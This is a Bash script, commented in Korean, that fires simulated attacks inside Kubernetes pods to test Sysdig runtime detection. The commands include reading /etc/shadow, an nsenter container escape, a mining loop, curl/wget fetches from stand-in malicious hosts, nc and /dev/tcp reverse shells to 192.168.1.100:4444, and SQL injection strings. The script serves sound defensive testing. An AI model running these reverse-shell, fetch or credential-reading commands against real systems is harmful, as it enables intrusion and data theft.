#!/bin/bash

# Sysdig 보안 이벤트 시뮬레이션 스크립트
# Voting App에서 다양한 보안 시나리오를 시뮬레이션하여 런타임 정책 테스트

set -e

# 색상 정의
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 로깅 함수
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# 네임스페이스 확인
NAMESPACE="voting-app"
if ! kubectl get namespace $NAMESPACE &> /dev/null; then
    log_error "네임스페이스 '$NAMESPACE'가 존재하지 않습니다."
    exit 1
fi

# 시뮬레이션 함수들

# 1. 의심스러운 파일 접근 시뮬레이션
simulate_suspicious_file_access() {
    log_info "🔍 의심스러운 파일 접근 시뮬레이션 시작..."
    
    # Vote 파드에서 /etc/passwd 파일 접근 시도
    VOTE_POD=$(kubectl get pods -n $NAMESPACE -l app=vote -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$VOTE_POD" ]; then
        log_warning "Vote 파드에서 /etc/passwd 파일 접근 시도"
        kubectl exec -n $NAMESPACE $VOTE_POD -- cat /etc/passwd > /dev/null 2>&1 || true
        
        log_warning "Vote 파드에서 /etc/shadow 파일 접근 시도"
        kubectl exec -n $NAMESPACE $VOTE_POD -- cat /etc/shadow > /dev/null 2>&1 || true
        
        log_warning "Vote 파드에서 /root 디렉토리 접근 시도"
        kubectl exec -n $NAMESPACE $VOTE_POD -- ls -la /root > /dev/null 2>&1 || true
    fi
    
    log_success "의심스러운 파일 접근 시뮬레이션 완료"
}

# 2. 승인되지 않은 네트워크 연결 시뮬레이션
simulate_unauthorized_network_connection() {
    log_info "🌐 승인되지 않은 네트워크 연결 시뮬레이션 시작..."
    
    # Worker 파드에서 외부 IP로 연결 시도
    WORKER_POD=$(kubectl get pods -n $NAMESPACE -l app=worker -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$WORKER_POD" ]; then
        log_warning "Worker 파드에서 외부 IP(8.8.8.8)로 연결 시도"
        kubectl exec -n $NAMESPACE $WORKER_POD -- timeout 5 nc -zv 8.8.8.8 53 > /dev/null 2>&1 || true
        
        log_warning "Worker 파드에서 의심스러운 포트(4444)로 연결 시도"
        kubectl exec -n $NAMESPACE $WORKER_POD -- timeout 5 nc -zv 127.0.0.1 4444 > /dev/null 2>&1 || true
    fi
    
    log_success "승인되지 않은 네트워크 연결 시뮬레이션 완료"
}

# 3. 예상치 못한 프로세스 실행 시뮬레이션
simulate_unexpected_process_execution() {
    log_info "⚡ 예상치 못한 프로세스 실행 시뮬레이션 시작..."
    
    # Result 파드에서 의심스러운 프로세스 실행
    RESULT_POD=$(kubectl get pods -n $NAMESPACE -l app=result -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$RESULT_POD" ]; then
        log_warning "Result 파드에서 wget 실행 시도"
        kubectl exec -n $NAMESPACE $RESULT_POD -- which wget > /dev/null 2>&1 && \
        kubectl exec -n $NAMESPACE $RESULT_POD -- timeout 5 wget --spider http://malicious-site.com > /dev/null 2>&1 || true
        
        log_warning "Result 파드에서 curl을 이용한 외부 스크립트 다운로드 시도"
        kubectl exec -n $NAMESPACE $RESULT_POD -- timeout 5 curl -s http://suspicious-script.com/script.sh > /dev/null 2>&1 || true
    fi
    
    log_success "예상치 못한 프로세스 실행 시뮬레이션 완료"
}

# 4. 권한 상승 시도 시뮬레이션
simulate_privilege_escalation() {
    log_info "🔐 권한 상승 시도 시뮬레이션 시작..."
    
    # Vote 파드에서 sudo 명령 시도
    VOTE_POD=$(kubectl get pods -n $NAMESPACE -l app=vote -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$VOTE_POD" ]; then
        log_warning "Vote 파드에서 sudo 명령 시도"
        kubectl exec -n $NAMESPACE $VOTE_POD -- sudo whoami > /dev/null 2>&1 || true
        
        log_warning "Vote 파드에서 su 명령 시도"
        kubectl exec -n $NAMESPACE $VOTE_POD -- su - root -c "whoami" > /dev/null 2>&1 || true
    fi
    
    log_success "권한 상승 시도 시뮬레이션 완료"
}

# 5. 컨테이너 탈출 시도 시뮬레이션
simulate_container_escape_attempt() {
    log_info "🏃 컨테이너 탈출 시도 시뮬레이션 시작..."
    
    # Worker 파드에서 Docker 소켓 접근 시도
    WORKER_POD=$(kubectl get pods -n $NAMESPACE -l app=worker -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$WORKER_POD" ]; then
        log_warning "Worker 파드에서 Docker 소켓 접근 시도"
        kubectl exec -n $NAMESPACE $WORKER_POD -- ls -la /var/run/docker.sock > /dev/null 2>&1 || true
        
        log_warning "Worker 파드에서 nsenter 명령 시도"
        kubectl exec -n $NAMESPACE $WORKER_POD -- nsenter --target 1 --mount --uts --ipc --net --pid -- ps aux > /dev/null 2>&1 || true
    fi
    
    log_success "컨테이너 탈출 시도 시뮬레이션 완료"
}

# 6. 암호화폐 채굴 시뮬레이션
simulate_crypto_mining() {
    log_info "💰 암호화폐 채굴 시뮬레이션 시작..."
    
    # Result 파드에서 채굴 프로세스 시뮬레이션
    RESULT_POD=$(kubectl get pods -n $NAMESPACE -l app=result -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$RESULT_POD" ]; then
        log_warning "Result 파드에서 의심스러운 CPU 집약적 프로세스 실행"
        kubectl exec -n $NAMESPACE $RESULT_POD -- timeout 10 sh -c 'while true; do echo "mining simulation" > /dev/null; done' > /dev/null 2>&1 || true
        
        log_warning "Result 파드에서 stratum 프로토콜 연결 시뮬레이션"
        kubectl exec -n $NAMESPACE $RESULT_POD -- timeout 5 nc -zv stratum.pool.com 4444 > /dev/null 2>&1 || true
    fi
    
    log_success "암호화폐 채굴 시뮬레이션 완료"
}

# 7. 리버스 쉘 시도 시뮬레이션
simulate_reverse_shell() {
    log_info "🐚 리버스 쉘 시도 시뮬레이션 시작..."
    
    # Vote 파드에서 리버스 쉘 시도
    VOTE_POD=$(kubectl get pods -n $NAMESPACE -l app=vote -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$VOTE_POD" ]; then
        log_warning "Vote 파드에서 netcat을 이용한 리버스 쉘 시도"
        kubectl exec -n $NAMESPACE $VOTE_POD -- timeout 5 nc -e /bin/sh 192.168.1.100 4444 > /dev/null 2>&1 || true
        
        log_warning "Vote 파드에서 bash를 이용한 리버스 쉘 시도"
        kubectl exec -n $NAMESPACE $VOTE_POD -- timeout 5 bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > /dev/null 2>&1 || true
    fi
    
    log_success "리버스 쉘 시도 시뮬레이션 완료"
}

# 8. SQL 인젝션 시뮬레이션
simulate_sql_injection() {
    log_info "💉 SQL 인젝션 시뮬레이션 시작..."
    
    # Result 파드에서 SQL 인젝션 패턴 시뮬레이션
    RESULT_POD=$(kubectl get pods -n $NAMESPACE -l app=result -o jsonpath='{.items[0].metadata.name}')
    if [ -n "$RESULT_POD" ]; then
        log_warning "Result 파드에서 의심스러운 SQL 쿼리 실행"
        kubectl exec -n $NAMESPACE $RESULT_POD -- node -e "console.log(\"SELECT * FROM votes WHERE id='1' OR '1'='1'\")" > /dev/null 2>&1 || true
        
        log_warning "Result 파드에서 SQL 인젝션 패턴 시뮬레이션"
        kubectl exec -n $NAMESPACE $RESULT_POD -- node -e "console.log(\"'; DROP TABLE votes; --\")" > /dev/null 2>&1 || true
    fi
    
    log_success "SQL 인젝션 시뮬레이션 완료"
}

# 메인 실행 함수
main() {
    log_info "🚀 Sysdig 보안 이벤트 시뮬레이션 시작"
    log_info "대상 네임스페이스: $NAMESPACE"
    
    echo
    log_info "다음 보안 시나리오들을 시뮬레이션합니다:"
    echo "1. 의심스러운 파일 접근"
    echo "2. 승인되지 않은 네트워크 연결"
    echo "3. 예상치 못한 프로세스 실행"
    echo "4. 권한 상승 시도"
    echo "5. 컨테이너 탈출 시도"
    echo "6. 암호화폐 채굴"
    echo "7. 리버스 쉘 시도"
    echo "8. SQL 인젝션"
    echo
    
    # 각 시뮬레이션 실행
    simulate_suspicious_file_access
    sleep 2
    
    simulate_unauthorized_network_connection
    sleep 2
    
    simulate_unexpected_process_execution
    sleep 2
    
    simulate_privilege_escalation
    sleep 2
    
    simulate_container_escape_attempt
    sleep 2
    
    simulate_crypto_mining
    sleep 2
    
    simulate_reverse_shell
    sleep 2
    
    simulate_sql_injection
    sleep 2
    
    echo
    log_success "🎉 모든 보안 이벤트 시뮬레이션 완료!"
    echo
    log_info "📊 Sysdig Secure 콘솔에서 다음 항목들을 확인하세요:"
    echo "  - Runtime Security Events"
    echo "  - Policy Violations"
    echo "  - Threat Detection Alerts"
    echo "  - Compliance Violations"
    echo "  - Activity Audit Logs"
    echo
    log_info "🔍 이러한 활동들이 의심스러운 이유:"
    echo "  1. 정상적인 애플리케이션 동작 범위를 벗어남"
    echo "  2. 보안 정책에서 금지된 행위들"
    echo "  3. 일반적인 공격 패턴과 유사함"
    echo "  4. 데이터 유출이나 시스템 손상 가능성"
    echo "  5. 컴플라이언스 요구사항 위반"
}

# 스크립트 실행
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
